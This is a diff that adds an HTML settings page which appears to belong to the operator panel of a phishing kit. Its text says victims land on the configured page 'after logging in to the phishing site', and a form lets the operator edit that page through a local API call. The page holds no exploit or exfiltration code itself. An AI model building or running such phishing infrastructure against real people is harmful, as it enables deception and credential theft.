@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Settings</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #00ff00;
+            font-family: 'Consolas', monospace;
+            padding: 40px;
+        }
+        h1 { font-size: 28px; margin-bottom: 30px; }
+        h2 { font-size: 20px; margin-top: 20px; margin-bottom: 10px; }
+        p { margin-bottom: 15px; }
+        textarea {
+            background-color: #1a1a1a;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            width: 100%;
+            max-width: 800px;
+            height: 400px;
+        }
+        button {
+            background-color: #0ea10e;
+            color: #00ff00;
+            border: none;
+            padding: 10px 20px;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #0c8f0c; }
+        .back-link { color: #00ff00; text-decoration: none; display: inline-block; margin-bottom: 20px; }
+        .back-link:hover { text-decoration: underline; }
+        .message { margin-top: 10px; color: #ffff00; }
+    </style>
+</head>
+<body>
+    <a href="/" class="back-link">← Back to Menu</a>
+    <h1>Settings</h1>
+    
+    <h2>Update the landing page</h2>
+    <p>The victim will land on this page after logging in to the phishing site</p>
+    <textarea id="landingPage">{{ landing_page }}</textarea>
+    <br>
+    <button onclick="updatePage()">Update Page</button>
+    <div class="message" id="message"></div>
+    
+    <script>
+        async function updatePage() {
+            const landingPage = document.getElementById('landingPage').value;
+            const messageEl = document.getElementById('message');
+            
+            try {
+                const response = await fetch('/api/update-landing-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ landing_page: landingPage })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    messageEl.textContent = 'Landing page updated successfully!';
+                } else {
+                    messageEl.textContent = 'Error: ' + data.error;
+                }
+            } catch (error) {
+                messageEl.textContent = 'Error: ' + error.message;
+            }
+        }
+    </script>
+</body>
+</html>
